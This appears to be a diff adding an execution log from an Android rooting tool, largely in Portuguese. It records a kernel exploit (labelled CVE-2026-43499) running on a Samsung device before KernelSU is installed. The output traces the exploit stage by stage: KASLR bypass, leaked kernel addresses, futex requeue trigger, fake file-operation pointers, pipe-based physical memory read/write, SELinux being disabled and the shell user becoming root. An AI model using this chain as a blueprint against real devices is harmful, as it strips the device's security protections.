@@ -1,0 +1,140 @@
+[*] Preparando a execução do Shizuku
+[+] Permissão do Shizuku concedida
+[*] Verificando manifesto de suporte no GitHub
+[+] Perfil de suporte: b0s-S908BXXSMGZB2-cleanup-official-preview
+[*] Baixando payloads
+[*] Baixando exploit
+[*] exploit verificado
+[*] Baixando KernelSU
+[*] KernelSU verificado
+[+] Download do payload completo
+[*] Rodando exploit de kernel
+[+] preload supervisor pid=21040 attempts=24 base_delay=20000
+[*] [trace4-supervisor] phase=before-fork attempt=1/24 t_us=146434016 delay=20000
+[+] exploit attempt=1/24 pid=21044 delay=20000
+[+] startup context pid=21044 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=21044 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=21044 label=S908BXXSMGZB2 slide=pselect main=exp32
+[+] p0 profile pid=21044 phys_offset=0000000080000000 kernel_phys_load=0000000080000000 delta=0000000000000000 slide_logger=ffffff8001e71380 bootid_data=ffffff800202e930 init_task=ffffff8001e7dd00 root_tg=ffffff80020f5080 sysctl_bootid=ffffff80022ed391
+[*] [cfi-trace6-physbase] live_memstart=0000000080000000 pre_slide_load=0000000080000000 image_text_offset=0000000000000000 phys_granule=0000000000008000 phys_slots=64 virtual_slide_separate=1 policy=scan-and-continue
+[*] [cfi-trace4] upstream=2b4e8a64b78d18f236f0d5b26cfd204bc46363ce target=S908BXXSMGZB2 policy=one-cfi-per-child lifecycle-breadcrumbs=1
+[*] [reclaim-life] stage=child-run-start pid=21044 inited=0 batch_cnt=0 rb_cur=0 active_batches=0 open_endpoints=0 current_open=0 ring=64
+[+] slide tracefs caller=ffffffc008297cc0 candidate=0000000000198000
+[+] slide-kaslr-ok source=tracefs pid=21044 base=ffffffc008198000 slide=0000000000198000 p0_offset=00198000
+[*] mm leaked=ffffff88daae83c0 base=ffffff88daae8000 object_index=1
+[*] mm slabinfo before-leak-close mm_struct           1802   1802    960   34    8 : tunables    0    0    0 : slabdata     53     53      0
+[-] [cfi-trace4] buddyinfo open failed errno=13
+[*] mm order3 absorb: pairs=683 skbs=2049 free3 -1 -> -1 (target=0)
+[*] mm skb reclaim sends=24/24 (pairs=8 hold)
+[*] [reclaim-life] stage=post-reclaim pid=21044 inited=1 batch_cnt=1 rb_cur=0 active_batches=1 open_endpoints=16 current_open=16 ring=64
+[*] replace_fake_fops this may cause deadlock
+[*] exp32 payload fake_fops=ffffff88daae8180 fake_lock=ffffff88daae84d0 write_target=ffffffc00a206060
+[*] [exp32-launch] phase=install-enter pid=21044 installed=0
+[*] install_embedded_exp32: /data/local/tmp/cve-exp32 (1645496 bytes)
+[*] [exp32-launch] phase=install-done pid=21044 path=/data/local/tmp/cve-exp32 bytes=1645496
+[*] [exp32-launch] phase=before-memfd pid=21044
+[*] [exp32-launch] phase=memfd-created pid=21044 fd=3
+[*] [exp32-launch] phase=payload-written pid=21044 fd=3 bytes=128
+[*] [exp32-launch] phase=before-fork pid=21044
+[*] [exp32-launch] phase=parent-after-fork pid=21044 child=26609
+[*] [exp32-launch] phase=parent-wait-start pid=21044 child=26609
+[*] [exp32-launch] phase=child-after-fork pid=26609 fd=3
+[*] [exp32-launch] phase=child-before-exec pid=26609 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-launch] phase=exec-syscall-enter pid=26609 path=/data/local/tmp/cve-exp32 fd=3
+[*] [exp32-enter] phase=constructor-enter
+[*] [exp32-enter] phase=main-enter pid=26609 argc=2
+[*] [exp32-enter] phase=before-pread pid=26609 fd=3
+[*] [exp32-enter] phase=payload-read pid=26609 fd=3 bytes=128
+[*] CVE-2026-43499 32-bit ARM stage (b0q) pid=26609
+[*] [exp32-enter] phase=threads-created pid=26609
+[-] pin_to_core: core 2 unavailable, using 6
+[-] pin_to_core: core 3 unavailable, using 4
+[*] waiter: FUTEX_WAIT_REQUEUE_PI on f_wait -> pi_target
+[*] main: FUTEX_CMP_REQUEUE_PI on f_wait -> pi_target
+[*] stamp probe: rc=-1 errno=99 — late validation, copy done (stamp lands)
+[*] consumer: trigger ret=0 errno=22 (cfs-nice)
+[*] main: exploit chain complete.
+[*] [exp32-launch] phase=parent-wait-end pid=21044 child=26609 raw_status=0
+[*] enter CFI stage
+[*] [cfi-trace6-physbase] slot-observe slot=0 phys_slide=00000000 target=ffffff800206e060 value=2d3939332f717269 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=2 phys_slide=00010000 target=ffffff800207e060 value=000000060000018c errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=5 phys_slide=00028000 target=ffffff8002096060 value=0000001ae0cb98db errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=7 phys_slide=00038000 target=ffffff80020a6060 value=5f6d70725f646864 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=9 phys_slide=00048000 target=ffffff80020b6060 value=000000010000018c errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=12 phys_slide=00060000 target=ffffff80020ce060 value=0000001fd9a38b70 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=14 phys_slide=00070000 target=ffffff80020de060 value=6c2e7070612e6469 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=16 phys_slide=00080000 target=ffffff80020ee060 value=0000000200000464 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=19 phys_slide=00098000 target=ffffff8002106060 value=0000002433c19720 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=20 phys_slide=000a0000 target=ffffff800210e060 value=3030303062333131 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=21 phys_slide=000a8000 target=ffffff8002116060 value=5f6d70725f646864 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=23 phys_slide=000b8000 target=ffffff8002126060 value=0000000400001512 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=26 phys_slide=000d0000 target=ffffff800213e060 value=00000014ec4e9ab4 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=29 phys_slide=000e8000 target=ffffff8002156060 value=6f72645f7064783e errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=30 phys_slide=000f0000 target=ffffff800215e060 value=4552202c64657070 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=31 phys_slide=000f8000 target=ffffff8002166060 value=31202d2029296567 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=32 phys_slide=00100000 target=ffffff800216e060 value=ffffffc0084ddf68 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=33 phys_slide=00108000 target=ffffff8002176060 value=0000000000000001 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=35 phys_slide=00118000 target=ffffff8002186060 value=6e656c5f753e2d43 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=36 phys_slide=00120000 target=ffffff800218e060 value=00736b6c626d756e errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=38 phys_slide=00130000 target=ffffff800219e060 value=ffffffc009ad5fd1 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=39 phys_slide=00138000 target=ffffff80021a6060 value=ffffffc009a8943e errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=41 phys_slide=00148000 target=ffffff80021b6060 value=ffffffc009a66c6c errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=42 phys_slide=00150000 target=ffffff80021be060 value=0000000000000124 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=44 phys_slide=00160000 target=ffffff80021ce060 value=00000000000001a4 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=45 phys_slide=00168000 target=ffffff80021d6060 value=ffffffc009a6af4a errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=46 phys_slide=00170000 target=ffffff80021de060 value=ffffffc008baad44 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=47 phys_slide=00178000 target=ffffff80021e6060 value=ffffffc00a1e5fd0 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=48 phys_slide=00180000 target=ffffff80021ee060 value=0000000000000001 errno=0
+[*] [cfi-trace6-physbase] slot-observe slot=49 phys_slide=00188000 target=ffffff80021f6060 value=6765746e695f7272 errno=0
+[+] [cfi-trace6-physbase] PHYS_SLOT_MATCH slot=51 phys_slide=00198000 target=ffffff8002206060 value=ffffff88daae8180 virtual_slide=0000000000198000
+[*] [cfi-trace6-physbase] address-domains physical_slot=51 physical_slide=00198000 virtual_slide=0000000000198000 data_alias=ffffff8002206060 canonical_target=ffffffc00a206060
+[*] [cfi-trace4] t_us=171059090 cpu=0 cycle=1 class=EXPECTED postwrite=EXPECTED ret=8 target=ffffff8002206060 read=ffffff88daae8180 want=ffffff88daae8180 mm=ffffff88daae83c0 page=ffffff88daae8000 object_index=1 reclaim=24/24 send_bytes=65536 errno=0
+[*] cfi write ret=35 errno=0
+[*] cfi read ret=35 errno=0
+[*] slide restore boot_id data pid=21044 ret=8 before=ffffffc00a485391 want=ffffffc00a485391 after=ffffffc00a485391 errno=0
+[*] slide restore rb parent type pid=21044 ret=8 before=0000000000000000 want=0000000000000001 after=0000000000000001 errno=0
+[*] phys step waiting for pipe page prepare...
+[*] prepare_pipe_buffer_page
+[*] pipe prep: skb sent, running kernelsnitch
+[*] pipe prep: leaked skb page base=ffffff8826640000
+[*] pipe prep: reclaim arrays done, reporting base
+[*] pipe prep: child reported base=ffffff8826640000 (got=8)
+[*] phys step pipe page base=ffffff8826640000
+[*] phys gate caches n2k=ffffff881e003680 c2k=0460000000000f82 pipe=0460000000000f82 base=ffffff8826640000
+[*] phys gate off=000 head=ffffffff20799000 slab_cache=ffffff881e003680 match=1 type=ffffffff
+[*] phys step pipe probe found=1 pipebuf=ffffff8826640000 idx=49 scan=1/1/1
+[*] phys step probed read done ok=1 idx=49
+[*] phys step probed write done ok=1
+[*] phys step read64 done ok=0 value=6161616161616161
+[*] phys step waiting for pipe page prepare...
+[*] prepare_pipe_buffer_page
+[*] pipe prep: skb sent, running kernelsnitch
+[*] pipe prep: leaked skb page base=ffffff89e4838000
+[*] pipe prep: reclaim arrays done, reporting base
+[*] pipe prep: child reported base=ffffff89e4838000 (got=8)
+[*] phys step pipe page base=ffffff89e4838000
+[*] phys gate caches n2k=ffffff881e003680 c2k=0460000000000f82 pipe=0460000000000f82 base=ffffff89e4838000
+[*] phys gate off=000 head=ffffffff27720e00 slab_cache=ffffff881e003680 match=1 type=ffffffff
+[*] phys step pipe probe found=1 pipebuf=ffffff89e4838000 idx=123 scan=1/1/1
+[*] phys step probed read done ok=1 idx=123
+[*] phys step probed write done ok=1
+[*] phys step read64 done ok=1 value=306365737562656e
+[*] root direct start uid=2000 fd=3
+[*] [rmg-bridge] helper=/data/local/tmp/ksu-helper client_uid=2000
+[*] root umh helper mode=755 uid=2000 gid=2000 x_ok=1
+[*] root umh selinux enforcing byte 1 -> 0 (addr=ffffff80023e0d58)
+[*] root umh queued wq=ffffff881e00b800 pwq=ffffff881e1bf100 pool=ffffff881e1c7800 work=ffffff88daaee000 entry=ffffff88daaee008 color=0 counters=0/0/2 writes=1/1/1/1/1
+[*] root umh result wake=1 complete=1 retval=0 socket=1
+[+] pipe-physrw-summary pid=21044 done=1 root=1 kaslr=1 base=ffffffc008198000 slide=0000000000198000
+[+] pipe physrw pid=21044 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[+] stability keeper pid=8278 retaining reclaimed kernel pages
+[*] [trace4-supervisor] phase=child-return attempt=1/24 pid=21044 rc=0 t_us=203782149
+[*] [trace4-supervisor] phase=child-reaped attempt=1/24 child=21044 raw_status=0 elapsed_us=57351429 t_us=203785445
+[+] exploit completed attempt=1/24
+
+[+] Root bootstrap adquirido
+[*] Carregando o KernelSU tardiamente
+[+] Preparação do KernelSU completa
+[+] Canal de controle do KernelSU verificado
+[*] KernelSU ativo
+[+] Instalação completa
